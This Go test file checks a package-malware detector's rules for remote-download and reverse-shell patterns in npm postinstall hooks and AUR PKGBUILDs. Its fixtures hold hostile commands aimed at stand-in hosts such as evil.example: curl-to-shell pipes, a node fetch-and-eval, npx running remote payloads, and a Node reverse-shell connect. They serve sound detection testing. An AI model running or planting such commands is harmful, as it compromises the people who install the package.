package detect

import "testing"

// inClass reports whether a finding with id is present in fs at the given class.
func inClass(fs []Finding, id string, class Class) bool {
	for _, f := range fs {
		if f.ID == id && f.Class == class {
			return true
		}
	}
	return false
}

// gtfobinsRE returns the compiled regexp for a gtfobins rule id (same package,
// so it can read the unexported pattern table).
func gtfobinsRE(t *testing.T, id string) func(string) bool {
	loadPatterns()
	for _, p := range patternsBySection["gtfobins_analysis"] {
		if p.id == id {
			return p.re.MatchString
		}
	}
	t.Fatalf("gtfobins rule %q not found", id)
	return nil
}

// TestGDownloadNodeRegex pins the rewritten G-DOWNLOAD-NODE: it must match a
// remote npx/npm-exec spec or a node remote fetch-eval, and must NOT match
// everyday local build tooling (`npx tsc`, `npx eslint .`, `npx @scope/pkg`).
func TestGDownloadNodeRegex(t *testing.T) {
	match := gtfobinsRE(t, "G-DOWNLOAD-NODE")
	shouldMatch := []string{
		`npx https://evil.example/payload.js`,
		`npm exec github:attacker/malware`,
		`npx -y git+https://evil.example/x.git`,
		`npx --package=https://evil/x foo`,
		`node -e "require('http').get('http://evil/x', r => eval(r))"`,
		`node --eval 'https.request(remote)'`,
	}
	shouldNotMatch := []string{
		`npx tsc -p .`,
		`npx eslint .`,
		`npx @scope/pkg build`,
		`npx wrangler deploy`,
		`npm exec jest`,
		`node build.js`,
	}
	for _, s := range shouldMatch {
		if !match(s) {
			t.Errorf("G-DOWNLOAD-NODE should match %q", s)
		}
	}
	for _, s := range shouldNotMatch {
		if match(s) {
			t.Errorf("G-DOWNLOAD-NODE should NOT match %q (false positive)", s)
		}
	}
}

// TestGtfobinsHookContext is the table-driven proof that dual-use gtfobins
// commands only mint inside an auto-execution surface, while unambiguous
// (override_gate) patterns mint everywhere.
func TestGtfobinsHookContext(t *testing.T) {
	cases := []struct {
		name      string
		ctx       *PackageContext
		malicious bool
		// id present at the given class (skip checks if id == "")
		evidenceID string
		contextID  string
		absentID   string
	}{
		{
			name:      "npx-tsc in npm manual build script",
			ctx:       &PackageContext{Name: "ssvc", PkgbuildContent: `"build": "npx tsc -p ."`, PkgbuildExecutes: false},
			malicious: false,
			absentID:  "G-DOWNLOAD-NODE",
		},
		{
			name:      "bare node -e in manual build is corroboration only",
			ctx:       &PackageContext{Name: "p", PkgbuildContent: `"build": "node -e \"require('./gen')\""`, PkgbuildExecutes: false},
			malicious: false,
			contextID: "G-NODE-INLINE",
			absentID:  "", // G-NODE-INLINE must NOT be evidence
		},
		{
			name:       "node remote fetch-eval in postinstall mints",
			ctx:        &PackageContext{Name: "p", InstallScriptContent: `"postinstall": "node -e \"require('http').get('http://evil/x',r=>eval(r))\""`},
			malicious:  true,
			evidenceID: "IS-G-DOWNLOAD-NODE",
		},
		{
			name:      "same node remote fetch-eval in runtime source is context only",
			ctx:       &PackageContext{Name: "p", PkgbuildContent: `node --eval 'https.request(remote)'`, PkgbuildExecutes: false},
			malicious: false,
			contextID: "G-DOWNLOAD-NODE",
		},
		{
			name:      "curl|sh in postinstall mints (override, any surface)",
			ctx:       &PackageContext{Name: "p", InstallScriptContent: "postinstall() { curl -s https://evil.example/x | sh }"},
			malicious: true,
		},
		{
			name:       "reverse shell in runtime source mints (override fires anywhere)",
			ctx:        &PackageContext{Name: "p", PkgbuildContent: `require('net').connect(1337, 'evil.example')`, PkgbuildExecutes: false},
			malicious:  true,
			evidenceID: "G-REVSHELL-NODE",
		},
		{
			name:      "aria2c in npm runtime source is context only",
			ctx:       &PackageContext{Name: "p", PkgbuildContent: `aria2c https://x.example/y`, PkgbuildExecutes: false},
			malicious: false,
			contextID: "G-DOWNLOAD-ARIA2C",
		},
		{
			name:       "aria2c in an auto-executing recipe mints",
			ctx:        &PackageContext{Name: "p", PkgbuildContent: `aria2c https://x.example/y`, PkgbuildExecutes: true},
			malicious:  true,
			evidenceID: "G-DOWNLOAD-ARIA2C",
		},
		{
			name:      "AUR PKGBUILD build() with curl|bash mints",
			ctx:       &PackageContext{Name: "p", PkgbuildContent: "build() {\n  curl https://evil.example/x | bash\n}", PkgbuildExecutes: true},
			malicious: true,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			f := Detect(tc.ctx)
			if got := IsMalicious(f); got != tc.malicious {
				t.Fatalf("IsMalicious=%v want %v; findings=%v", got, tc.malicious, ids(f))
			}
			if tc.evidenceID != "" && !inClass(f, tc.evidenceID, ClassEvidence) {
				t.Errorf("expected %q as ClassEvidence; findings=%v", tc.evidenceID, ids(f))
			}
			if tc.contextID != "" {
				if !inClass(f, tc.contextID, ClassContext) {
					t.Errorf("expected %q as ClassContext; findings=%v", tc.contextID, ids(f))
				}
				if inClass(f, tc.contextID, ClassEvidence) {
					t.Errorf("%q must NOT be ClassEvidence outside a hook surface; findings=%v", tc.contextID, ids(f))
				}
			}
			if tc.absentID != "" && has(f, tc.absentID) {
				t.Errorf("%q must be absent; findings=%v", tc.absentID, ids(f))
			}
		})
	}
}
